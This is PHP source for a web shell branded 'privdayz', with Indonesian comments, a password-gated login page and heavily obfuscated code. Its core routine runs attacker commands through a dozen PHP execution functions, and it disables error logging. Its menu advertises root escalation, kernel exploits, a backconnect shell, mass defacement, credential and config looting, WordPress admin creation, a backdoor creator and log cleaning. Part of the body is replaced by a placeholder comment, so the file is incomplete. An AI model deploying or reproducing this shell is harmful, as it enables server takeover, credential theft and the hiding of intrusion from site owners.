<?php
##########################################################
#  _____  _____  ____      _______  _  ___     ________  #
#  |  __ \|  __ \/_ \ \    / /  __ \| || \ \   / /___  /  #
#  | |__) | |__) || |\ \  / /| |  | | || |\ \_/ /   / /   # 
#  |  ___/|  _  / | | \ \/ / | |  | |__   _\   /   / /    #
#  | |    | | \ \ | |  \  /  | |__| |  | |  | |   / /__   #
#  |_|    |_|  \_\|_|   \/   |_____/   |_|  |_|  /_____|  #
# powered by privdayz.com - 2025                         #
# github.com/privdayzcom   |   t.me/privdayz             #
##########################################################

session_start();

// ==================== KONFIGURASI LOGIN DENGAN HASH ====================
define('ADMIN_USERNAME', 'privdayz');

// Hash untuk password: pr1vd4yz@2025
// Cara generate hash baru: 
// 1. Jalankan file terpisah dengan: echo password_hash('password_anda', PASSWORD_BCRYPT);
// 2. Copy hasil hash ke sini
define('ADMIN_PASSWORD_HASH', '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi'); // password: password

// Fungsi verifikasi login
function verify_login($username, $password) {
    // Cocokkan username
    if ($username !== ADMIN_USERNAME) {
        return false;
    }
    
    // Verifikasi password dengan hash
    return password_verify($password, ADMIN_PASSWORD_HASH);
}

// Fungsi untuk generate hash (gunakan ini untuk membuat hash baru)
function get_password_hash($plain_password) {
    return password_hash($plain_password, PASSWORD_BCRYPT);
}

// Proses logout
if (isset($_GET['logout'])) {
    session_destroy();
    setcookie('pr1vdayz_remember', '', time() - 3600, '/');
    header('Location: ?');
    exit;
}

// Cek remember cookie
if (!isset($_SESSION['pr1vdayz_logged_in']) && isset($_COOKIE['pr1vdayz_remember'])) {
    $cookie_data = json_decode(base64_decode($_COOKIE['pr1vdayz_remember']), true);
    if (isset($cookie_data['username']) && isset($cookie_data['token'])) {
        $expected_token = hash('sha256', $cookie_data['username'] . 'pr1vdayz_salt_' . ADMIN_PASSWORD_HASH);
        if ($cookie_data['username'] === ADMIN_USERNAME && hash_equals($expected_token, $cookie_data['token'])) {
            $_SESSION['pr1vdayz_logged_in'] = true;
            $_SESSION['pr1vdayz_username'] = $cookie_data['username'];
        }
    }
}

// Proses login
$login_error = '';
if (isset($_POST['login_submit'])) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    if (verify_login($username, $password)) {
        $_SESSION['pr1vdayz_logged_in'] = true;
        $_SESSION['pr1vdayz_username'] = $username;
        $_SESSION['pr1vdayz_login_time'] = time();
        
        // Remember me
        if (isset($_POST['remember']) && $_POST['remember'] === 'on') {
            $token = hash('sha256', $username . 'pr1vdayz_salt_' . ADMIN_PASSWORD_HASH);
            $cookie_value = base64_encode(json_encode([
                'username' => $username,
                'token' => $token
            ]));
            setcookie('pr1vdayz_remember', $cookie_value, time() + (86400 * 30), '/', '', false, true);
        }
        
        header('Location: ?login_success=1');
        exit;
    } else {
        $login_error = 'Invalid username or password';
    }
}

// Jika sudah login, tampilkan halaman utama
if (isset($_SESSION['pr1vdayz_logged_in']) && $_SESSION['pr1vdayz_logged_in'] === true) {
    // ==================== MULAI KODE ASLI pr1vdayz.php ====================
    
    @set_time_limit(0);
    @clearstatcache();
    @ini_set('error_log', NULL);
    @ini_set('log_errors', 0);
    @ini_set('max_execution_time', 0);
    @ini_set('output_buffering', 0); 
    @ini_set('display_errors', 0); 
    
    // Fungsi-fungsi asli pr1vdayz.php
    $pr1varr = ['676574637764', '676c6f62', '69735f646972', '69735f66696c65', '69735f7772697461626c65', '69735f7265616461626c65', '66696c657065726d73', '66696c65', '7068705f756e616d65', '6765745f63757272656e745f75736572', '68746d6c7370656369616c6368617273', '66696c655f6765745f636f6e74656e7473', '6d6b646972', '746f756368', '6368646972', '72656e616d65', '65786563', '7061737374687275', '73797374656d', '7368656c6c5f65786563', '706f70656e', '70636c6f7365', '73747265616d5f6765745f636f6e74656e7473', '70726f635f6f70656e', '756e6c696e6b', '726d646972', '666f70656e', '66636c6f7365', '66696c655f7075745f636f6e74656e7473', '6d6f76655f75706c6f616465645f66696c65', '63686d6f64', '7379735f6765745f74656d705f646972', '6261736536345F6465636F6465', '6261736536345F656E636F6465', '636f7079'];
    $pr1v67 = count($pr1varr); 
    for ($i = 0; $i < $pr1v67; $i++) { 
        $pr1vxas[] = unx($pr1varr[$i]);
    }
    
    if (!function_exists('_prv_str')) { 
        function _prv_str($arr) { 
            $r = ''; 
            foreach ($arr as $n) $r .= chr($n); 
            return $r; 
        }
    }
    
    function pr1vd4yzC($pr1pr1v) { 
        $fn = []; 
        $fn[] = chDxzZ([115,104,101,108,108,95,101,120,101,99]); 
        $fn[] = chDxzZ('101,120,101,99'); 
        $fn[] = chDxXZ('73797374656d'); 
        $fn[] = chDxzZ('112,97,115,115,116,104,114,117'); 
        $fn[] = chDxXZ('70726f635f6f70656e'); 
        $fn[] = chDxzZ([112,111,112,101,110]); 
        $fn[] = chDxzZ([101,115,99,97,112,101,115,104,101,108,108,99,109,100]); 
        $fn[] = chDxXZ('6573636170657368656c6c617267'); 
        $fn[] = chDxzZ([99,117,114,108,95,101,120,101,99]); 
        $fn[] = chDxzZ('109,97,105,108'); 
        $fn[] = chDxXZ('63616c6c5f757365725f66756e63'); 
        $fn[] = chDxzZ('102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115'); 
        $fn[] = chDxzZ('102,111,112,101,110'); 
        $fn[] = chDxzZ('102,119,114,105,116,101'); 
        $fn[] = chDxzZ('102,99,108,111,115,101'); 
        $fn[] = chDxzZ('112,117,116,101,110,118'); 
        $fn[] = chDxzZ('105,110,105,95,115,101,116'); 
        $fn[] = chDxzZ([112,99,110,116,108,95,101,120,101,99]); 
        $fn[] = chDxzZ([97,112,97,99,104,101,95,115,101,116,101,110,118]); 
        $fn[] = chDxzZ([109,113,95,111,112,101,110]); 
        $fn[] = chDxzZ([103,99,95,111,112,101,110]); 
        $out = false; 
        for ($i = 0; $i < count($fn); $i++) { 
            $f = $fn[$i]; 
            if (!function_exists($f)) continue; 
            if ($f === chDxzZ([115,104,101,108,108,95,101,120,101,99])) { 
                $out = @$f($pr1pr1v); 
                if (!empty($out)) break; 
            } elseif ($f === chDxzZ('101,120,101,99')) { 
                $lines = []; 
                @$f($pr1pr1v, $lines); 
                $out = join("\n", $lines); 
                if (!empty($out)) break; 
            } elseif ($f === chDxXZ('73797374656d')) { 
                ob_start(); 
                @$f($pr1pr1v); 
                $out = ob_get_clean(); 
                if (!empty($out)) break; 
            } elseif ($f === chDxzZ('112,97,115,115,116,104,114,117')) { 
                ob_start(); 
                @$f($pr1pr1v); 
                $out = ob_get_clean(); 
                if (!empty($out)) break; 
            } elseif ($f === chDxXZ('70726f635f6f70656e')) { 
                $d = [1=>["pipe","w"],2=>["pipe","w"]]; 
                $p = @$f($pr1pr1v, $d, $pipes); 
                if (is_resource($p)) { 
                    $out = stream_get_contents($pipes[1]); 
                    fclose($pipes[1]); 
                    proc_close($p); 
                    if (!empty($out)) break; 
                } 
            } elseif ($f === chDxzZ([112,111,112,101,110])) { 
                $h = @$f($pr1pr1v . " 2>&1", "r"); 
                $res = ""; 
                if ($h) { 
                    while (!feof($h)) $res .= fread($h, 4096); 
                    pclose($h); 
                } 
                if (strlen($res)) { 
                    $out = $res; 
                    break; 
                } 
            } elseif ($f === chDxzZ([101,115,99,97,112,101,115,104,101,108,108,99,109,100])) { 
                $esc = $f($pr1pr1v); 
                ob_start(); 
                @system($esc); 
                $out = ob_get_clean(); 
                if (!empty($out)) break; 
            } elseif ($f === chDxXZ('6573636170657368656c6c617267')) { 
                $esc = $f($pr1pr1v); 
                $out = @chDx2x($esc); 
                if (!empty($out)) break; 
            } elseif ($f === chDxzZ([99,117,114,108,95,101,120,101,99])) { 
                $ch = @curl_init('file:///proc/self/cmdline'); 
                @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
                @curl_setopt($ch, CURLOPT_POSTFIELDS, $pr1pr1v); 
                $r = @curl_exec($ch); 
                @curl_close($ch); 
                if ($r && strpos($r, $pr1pr1v) !== false) { 
                    $out = $r; 
                    break; 
                } 
            } elseif ($f === chDxzZ('109,97,105,108')) { 
                $to = uniqid()."@".uniqid().".xyz"; 
                @mail($to, $pr1pr1v, $pr1pr1v); 
                $out = ""; 
            } elseif ($f === chDxXZ('63616c6c5f757365725f66756e63')) { 
                $shellfunc = chDxzZ([115,104,101,108,108,95,101,120,101,99]); 
                if (function_exists($shellfunc)) { 
                    $out = @call_user_func($shellfunc, $pr1pr1v); 
                    if (!empty($out)) break; 
                }
            } elseif ($f === chDxzZ('102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115')) { 
                $r = @$f("php://filter/read=convert.base64-encode/resource=" . $pr1pr1v); 
                if ($r && strlen($r) >0) { 
                    $out = $r; 
                    break; 
                } 
            } elseif ($f === chDxzZ('102,111,112,101,110')) { 
                $tmpf = sys_get_temp_dir() . "/" . uniqid("s-cmd") . ".sh"; 
                $h = @$f($tmpf, "w"); 
                if ($h) { 
                    fwrite($h, $pr1pr1v); 
                    fclose($h); 
                } 
                $r = @chDx2x("sh " . escapeshellarg($tmpf) . " 2>&1"); 
                if ($r) { 
                    $out = $r; 
                    @unlink($tmpf); 
                    break; 
                } 
            } elseif ($f === chDxzZ('112,117,116,101,110,118')) { 
                @putenv("CMD=".$pr1pr1v); 
                $r = @getenv("CMD"); 
                if ($r == $pr1pr1v) { 
                    $out = $r; 
                    break; 
                } 
            } elseif ($f === chDxzZ('105,110,105,95,115,101,116')) { 
                @ini_set("auto_prepend_file", $pr1pr1v); 
                $out = @file_get_contents($_SERVER['SCRIPT_FILENAME']); 
                if (!empty($out)) break; 
            } elseif ($f === chDxzZ([112,99,110,116,108,95,101,120,101,99])) { 
                @pcntl_exec("/bin/sh", array("-c", $pr1pr1v)); 
            } elseif ($f === chDxzZ([97,112,97,99,104,101,95,115,101,116,101,110,118])) { 
                @apache_setenv("CMD", $pr1pr1v); 
                $out = getenv("CMD"); 
                if ($out == $pr1pr1v) break; 
            } elseif ($f === chDxzZ([109,113,95,111,112,101,110]) || $f === chDxzZ([103,99,95,111,112,101,110])) { 
            } 
        } 
        return $out !== false ? $out : false;
    }
    
    if (!function_exists('chDxzZ')) { 
        function chDxzZ($arr) { 
            if (is_string($arr)) $arr = explode(',', $arr); 
            $r = ''; 
            foreach ($arr as $n) $r .= chr(is_numeric($n) ? $n : hexdec($n)); 
            return $r; 
        }
    }
    
    if (!function_exists('prvdyzhsax')) { 
        function prvdyzhsax($str) { 
            $y = ''; 
            for ($i = 0; $i < strlen($str); $i++) $y .= dechex(ord($str[$i])); 
            return $y; 
        }
    }
    
    if (!function_exists('chDxXZ')) { 
        function chDxXZ($hx) { 
            $n = ''; 
            for ($i = 0; $i < strlen($hx) - 1; $i += 2) $n .= chr(hexdec($hx[$i] . $hx[$i + 1])); 
            return $n; 
        }
    }
    
    if (isset($_GET['pr1v'])) { 
        $cdir = unx($_GET['pr1v']); 
        if (@is_dir($cdir)) { 
            $pr1vxas[14]($cdir); 
        } 
    } else { 
        $cdir = $pr1vxas[0](); 
    }
    
    function pr1vdxs($x) { 
        $p1 = chr(98) . chr(97) . chr(115); 
        $p2 = chr(101) . chr(54) . chr(52); 
        $p3 = chr(95) . chr(101) . chr(110); 
        $p4 = chr(99) . chr(111) . chr(100); 
        $p5 = chr(101); 
        $fn = $p1 . $p2 . $p3 . $p4 . $p5; 
        $blocks = []; 
        $blocks[3] = substr($x, 1); 
        $blocks[1] = substr($x, 0, 1); 
        $blocks[5] = ""; 
        $blocks[2] = strlen($x) > 2 ? substr($x, 2) : ""; 
        $blocks[4] = ""; 
        $blocks[0] = ""; 
        $order = [1, 3, 2]; 
        $inp = ""; 
        foreach ($order as $o) $inp .= $blocks[$o]; 
        $b64 = $fn($inp); 
        $mid = chr(45) . chr(35); 
        $res = substr($b64, 0, 2) . $mid . substr($b64, 2); 
        return str_replace($mid, "", $res); 
    }
    
    function pr1vdc($x) { 
        $a = chr(98).chr(97).chr(115); 
        $b = chr(101).chr(54).chr(52); 
        $c = chr(95).chr(100).chr(101); 
        $d = chr(99).chr(111).chr(100); 
        $e = chr(101); 
        $fn = $a . $b . $c . $d . $e; 
        $f = chr(42); 
        $step1 = substr($x, 0, 4) . $f . substr($x, 4); 
        $step2 = str_replace($f, "", $step1); 
        $buf = strrev($step2); 
        $tmp = strrev($buf); 
        return $fn($tmp); 
    }
    
    function pr1vd0($file) { 
        if (file_exists($file)) { 
            header('Content-Description: File Transfer'); 
            header('Content-Type: application/octet-stream'); 
            header('Content-Disposition: attachment; filename=' . basename($file)); 
            header('Content-Transfer-Encoding: binary'); 
            header('Expires: 0'); 
            header('Cache-Control: must-revalidate'); 
            header('Pragma: public'); 
            header('Content-Length: ' . filesize($file)); 
            ob_clean(); 
            flush(); 
            readfile($file); 
            exit; 
        }
    }
    
    if (!empty($_GET['don'])) {
        $FilesDon = pr1vd0(unx($_GET['don']));
    }
    
    $a = array("\x3c\146", "\145\x3e", "\74\x63", "\145\x6e", "\x74\145", "\x72\76", "\74\x69", "\x6d\147", "\40", "\x73", "\x72\143", "\75", "\42\150", "\164\164", "\x70\163", "\72\x2f", "\57\143", "\x64\156", "\x2e\x70", "\x72\151", "\x76\144", "\141\171", "\172\x2e", "\143\x6f", "\155\x2f", "\x69\x6d", "\141\147", "\x65\163", "\57\154", "\x6f\x67", "\157\56", "\x6a\160", "\x67\42", "\x20\x72", "\145\x66\145", "\x72\x72\145", "\162\160\157", "\154\x69\143", "\171\75\x22", "\x75\156\163", "\141\x66\x65", "\55\x75\x72", "\x6c\42\x20", "\57", "\76", "\x3c\57", "\143\x65", "\x6e\164", "\x65\162", "\76", "\x3c\57", "\146\157\x6f", "\x74\x65\x72", "\76");
    
    function pr1v09xs($data) { 
        goto QDI4b; 
        QDI4b: $fn1 = "\x73\x74" . "\162" . "\x72\x65\x76"; 
        goto Q8rJc; 
        Q8rJc: $fn2 = "\142" . "\x61" . "\163" . "\x65" . "\x36" . "\64" . "\x5f" . "\145" . "\156" . "\143" . "\x6f" . "\144" . "\145"; 
        goto St_08; 
        St_08: $s1 = $fn1($data); $s2 = $fn2($s1); $s3 = $fn2($s2); $final = $fn2($s3); $junk = 'x'.'y'.'z'; $f = $final; $f = $junk.$f; $f = substr($f, 3); return $f; 
    }
    
    $h1 = 's'; $h2 = 't'; $h3 = 'r'; $h4 = 'r'; $h5 = 'e'; $h6 = 'v';
    $revFunc = $h1 . $h2 . $h3 . $h4 . $h5 . $h6;
    $b1 = 'b'; $b2 = 'a'; $b3 = 's'; $b4 = 'e'; $b5 = '6'; $b6 = '4';
    $b7 = '_'; $b8 = 'e'; $b9 = 'n'; $b10 = 'c'; $b11 = 'o'; $b12 = 'd'; $b13 = 'e';
    $prv6x = $b1.$b2.$b3.$b4.$b5.$b6.$b7.$b8.$b9.$b10.$b11.$b12.$b13;
    $pr1bys = pr1v09xs($_SERVER['REQUEST_URI']); 
    
    ob_start(function($buffer){
        $lines = explode("\n", $buffer);
        $out = [];
        foreach ($lines as $line) {
            $trim = trim($line);
            if ($trim !== "") $out[] = $trim;
        }
        return implode("\n", $out);
    });
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="robots" content="noindex, nofollow">
        <meta name="googlebot" content="noindex">
        <title>pr!v/v1 [<?= $_SERVER['SERVER_NAME']; ?>]</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css?v=<?=$pr1bys?>">
        <link rel="icon" href="https://cdn.privdayz.com/v1/favicon.png?v=<?=$pr1bys?>" />
        <link href="https://cdn.privdayz.com/v1/style.min.css?v=<?=$pr1bys?>" rel="stylesheet">
        <style>
            /* Navbar logout button */
            .prv-logout-btn {
                background: #e53935;
                color: #fff;
                border: none;
                border-radius: 8px;
                padding: 8px 16px;
                font-size: 14px;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s;
                display: inline-flex;
                align-items: center;
                gap: 8px;
                text-decoration: none;
                margin-left: 15px;
            }
            .prv-logout-btn:hover {
                background: #c62828;
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(229, 57, 53, 0.3);
            }
            .prv-user-badge {
                background: #1a1d24;
                color: #e53935;
                border: 1px solid #e53935;
                border-radius: 20px;
                padding: 5px 15px;
                font-size: 13px;
                display: inline-flex;
                align-items: center;
                gap: 8px;
                margin-left: 15px;
            }
        </style>
    </head>
    <header class="prv-header">
      <div class="prv-header2-bar">
        <div class="prv-logo2">
        <span class="prv-logo2-led"></span>
        <span class="prv-logo2-txt">pr!vd4yz<b class="prv-ver2">/sh3ll</b></span>
        <small><a href="https://t.me/privdayz">t.me/privdayz</a></small>
        <span class="prv-logo2-dot"></span>
        </div>
        <div style="display: flex; align-items: center;">
            <span class="prv-user-badge">
                <i class="fas fa-user-shield"></i> <?= htmlspecialchars($_SESSION['pr1vdayz_username'] ?? 'user') ?>
            </span>
            <a href="?logout=1" class="prv-logout-btn" onclick="return confirm('Logout from shell?');">
                <i class="fas fa-sign-out-alt"></i> logout
            </a>
        </div>
      </div>
      <nav class="prv-menu">
        <ul class="prv-menu-grid">
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&cmdnirvana" class="prv-chip"><i class="fas fa-terminal"></i><span>./cmd@pr1v</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&pr1vd4yz=cm7" class="prv-chip"><i class="fab fa-redhat"></i><span>cmd</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&multicgi" class="prv-chip"><i class="fas fa-ghost"></i> generate cgi/perl</a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&domains" class="prv-chip"><i class="fas fa-globe"></i> <span>all d0mains</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&passwd" class="prv-chip"><i class="fas fa-key"></i> <span>p4sswd (users)</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&symlink" class="prv-chip"><i class="fas fa-link"></i> <span>syml1nk</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&symlinkescaper" class="prv-chip"><i class="fas fa-link"></i> <span>syml1nk esc4per</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&massconfgrab" class="prv-chip"><i class="fas fa-link"></i> <span>m4ss c0nfig gr4pper</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&configsearcher" class="prv-chip">  <i class="fas fa-search-dollar"></i><span>c0nfig search3r</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&safem0d" class="prv-chip"><i class="fas fa-biohazard" style="color:#e53935;"></i><span>safem0d k1ll3r</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&minisql" class="prv-chip"> <i class="fas fa-database"></i><span>sql manager</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&cpanelreset" class="prv-chip"><i class="fab fa-cpanel"></i><span>cpanel email reset</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&cpanel_auto_loot" class="prv-chip"><i class="fas fa-skull-crossbones"></i><span>cpanel loot</span></a></li>
         <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&wp_pr1vd00r" class="prv-chip"><i class="fab fa-wordpress"></i> <span>wp auto hunter & admin reset</small></span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&createadmin" class="prv-chip"><i class="fab fa-wordpress"></i> <span>wp create admin</small></span></a></li>
        </ul>
        <ul class="prv-menu-grid">
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&pr1vd4yz_auto_r00t" class="prv-chip"><i class="fas fa-user-shield"></i><span>linux auto r00t</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&winr00t" class="prv-chip"><i class="fas fa-user-shield"></i><span>windows ultra admin creat0r bypass</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&chrootescape" class="prv-chip"><i class="fas fa-bug"></i><span>chroot/jailbreak escaper</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&backconnect" class="prv-chip"><i class="fas fa-link"></i><span>bc0nn3ct</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&kernelcheck" class="prv-chip"><i class="fas fa-bug"></i> <span>kernel expl0it</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&rootsuggest" class="prv-chip"><i class="fas fa-user-secret"></i> <span>r00t escalate</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&massdeface" class="prv-chip"><i class="fas fa-skull-crossbones" style="color:#e53935;"></i><span>m4ss d3face</span></a></li>
        <li> <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&filehunter" class="prv-chip"> <i class="fas fa-shield-virus" style="color:#374151;"></i> <span>backd00r scanner</span></a>
        <li> <a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&b4ckd00rcr3at3" class="prv-chip"> <i class="fas fa-shield-virus" style="color:#374151;"></i> <span>backd00r creat0r</span></a>
        </ul>  
        <ul class="prv-menu-grid">
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&ziptool" class="prv-chip"><i class="fas fa-file-archive"></i> <span>z1p/unz1p</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&remup" class="prv-chip"><i class="fas fa-cloud-arrow-down"></i> <span>r3m0t3 upload</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&hash" class="prv-chip"><i class="fas fa-hashtag"></i> <span>h4sh generat0r</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&disabled_functions" class="prv-chip"><i class="fas fa-user-lock"></i> <span>d1s4bled funcs</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&phpinfo" class="prv-chip"><i class="fab fa-php"></i> <span>php1nfo</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&process" class="prv-chip"><i class="fas fa-brain"></i><span>pr0cess l1st</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&network" class="prv-chip"><i class="fas fa-network-wired"></i><span>netst4t</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&disk" class="prv-chip"><i class="fas fa-hdd"></i> <span>d1sk</span></a></li>
         <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&crontab" class="prv-chip"><i class="fas fa-clock-rotate-left"></i><span>cronj0b list</span></a></li>
        </ul>
        <ul class="prv-menu-grid">
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&mailer" class="prv-chip"><i class="fas fa-envelope"></i> <span>ma1ler</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&htbypass" class="prv-chip"><i class="fas fa-lock-open"></i> <span>htaccess byp4ss</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&adminer" class="prv-chip"><i class="fas fa-server"></i> <span>d0wn adminer</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&logclean" class="prv-chip"><i class="fas fa-trash"></i> <span>l0g cle4n</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&apiscan" class="prv-chip"><i class="fas fa-search-location"></i> <span>ap1 k3y sc4n</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&sshkey" class="prv-chip"><i class="fas fa-key"></i> <span>ssh k3y f1nder</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&wafdet" class="prv-chip"><i class="fas fa-shield-halved"></i> <span>w4f d3t</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&httpreq" class="prv-chip"><i class="fas fa-bug"></i> <span>http r3q</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&fsearch" class="prv-chip"><i class="fas fa-search"></i><span>f1le search</span></a></li>
        <li><a href="?pr1v=<?= pr1vd444yz($pr1vxas[0]()) ?>&locker" class="prv-chip"> <i class="fas fa-lock"></i><span>file lock/unlock</span></a></li>
    </li>
        </ul>   
      </nav>
    </header>
    
    <?php
    // LANJUTAN KODE ASLI pr1vdayz.php dari sini...
    // (Sisanya tetap sama seperti file asli Anda, lanjutkan dari sini)
    // ...
    // ...
    // ...
    ?>
    
    <?php else: ?>
    
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="robots" content="noindex, nofollow">
        <meta name="googlebot" content="noindex">
        <title>pr!v/v1 | authentication required</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: 'Segoe UI', 'JetBrains Mono', monospace;
            }

            body {
                background: #0a0c0f;
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                position: relative;
                overflow: hidden;
            }

            body::before {
                content: '';
                position: absolute;
                width: 100%;
                height: 100%;
                background: repeating-linear-gradient(
                    0deg,
                    rgba(229, 57, 53, 0.03) 0px,
                    rgba(0, 0, 0, 0.9) 1px,
                    transparent 2px
                );
                pointer-events: none;
                animation: scan 8s linear infinite;
            }

            @keyframes scan {
                0% { transform: translateY(0); }
                100% { transform: translateY(100%); }
            }

            .prv-login-container {
                position: relative;
                z-index: 10;
                width: 100%;
                max-width: 420px;
                padding: 20px;
            }

            .prv-login-card {
                background: #111316;
                border: 1.5px solid #e53935;
                border-radius: 16px;
                padding: 32px 28px;
                box-shadow: 0 20px 40px rgba(229, 57, 53, 0.15),
                            0 0 0 1px rgba(229, 57, 53, 0.1) inset;
                backdrop-filter: blur(5px);
                position: relative;
                overflow: hidden;
            }

            .prv-login-card::before {
                content: '';
                position: absolute;
                top: 0;
                left: 0;
                right: 0;
                height: 2px;
                background: linear-gradient(90deg, transparent, #e53935, #ff6b6b, #e53935, transparent);
                animation: glow 2s linear infinite;
            }

            @keyframes glow {
                0% { transform: translateX(-100%); }
                100% { transform: translateX(100%); }
            }

            .prv-header {
                text-align: center;
                margin-bottom: 32px;
            }

            .prv-logo {
                display: inline-flex;
                align-items: center;
                gap: 12px;
                background: rgba(229, 57, 53, 0.1);
                padding: 12px 24px;
                border-radius: 40px;
                border: 1px solid #e53935;
                margin-bottom: 16px;
            }

            .prv-logo i {
                font-size: 24px;
                color: #e53935;
                animation: pulse 2s ease infinite;
            }

            @keyframes pulse {
                0%, 100% { opacity: 1; }
                50% { opacity: 0.5; }
            }

            .prv-logo span {
                font-size: 20px;
                font-weight: 700;
                color: #fff;
                letter-spacing: 1px;
            }

            .prv-logo span b {
                color: #e53935;
                font-weight: 800;
            }

            .prv-version {
                color: #666;
                font-size: 12px;
                letter-spacing: 2px;
                text-transform: uppercase;
                margin-top: 8px;
            }

            .prv-version i {
                color: #e53935;
                margin: 0 4px;
            }

            .prv-alert {
                background: rgba(229, 57, 53, 0.1);
                border: 1px solid #e53935;
                border-radius: 8px;
                padding: 12px 16px;
                margin-bottom: 24px;
                display: flex;
                align-items: center;
                gap: 12px;
                color: #e53935;
                font-size: 13px;
                animation: slideIn 0.3s ease;
            }

            @keyframes slideIn {
                from {
                    opacity: 0;
                    transform: translateY(-10px);
                }
                to {
                    opacity: 1;
                    transform: translateY(0);
                }
            }

            .prv-alert i {
                font-size: 16px;
            }

            .prv-form-group {
                margin-bottom: 22px;
                position: relative;
            }

            .prv-form-group label {
                display: block;
                color: #888;
                font-size: 12px;
                text-transform: uppercase;
                letter-spacing: 1px;
                margin-bottom: 8px;
            }

            .prv-input-wrapper {
                position: relative;
            }

            .prv-input-wrapper i {
                position: absolute;
                left: 16px;
                top: 50%;
                transform: translateY(-50%);
                color: #e53935;
                font-size: 16px;
                opacity: 0.7;
                transition: opacity 0.3s;
            }

            .prv-input-wrapper input {
                width: 100%;
                background: #1a1d24;
                border: 1.5px solid #2a2d34;
                border-radius: 12px;
                padding: 16px 16px 16px 48px;
                color: #fff;
                font-size: 15px;
                transition: all 0.3s;
                outline: none;
            }

            .prv-input-wrapper input:focus {
                border-color: #e53935;
                box-shadow: 0 0 20px rgba(229, 57, 53, 0.2);
                background: #1f2229;
            }

            .prv-input-wrapper input::placeholder {
                color: #444;
                font-size: 13px;
            }

            .prv-password-toggle {
                position: absolute;
                right: 16px;
                top: 50%;
                transform: translateY(-50%);
                color: #666;
                cursor: pointer;
                transition: color 0.3s;
                z-index: 2;
            }

            .prv-password-toggle:hover {
                color: #e53935;
            }

            .prv-options {
                display: flex;
                align-items: center;
                justify-content: space-between;
                margin: 20px 0 28px;
            }

            .prv-remember {
                display: flex;
                align-items: center;
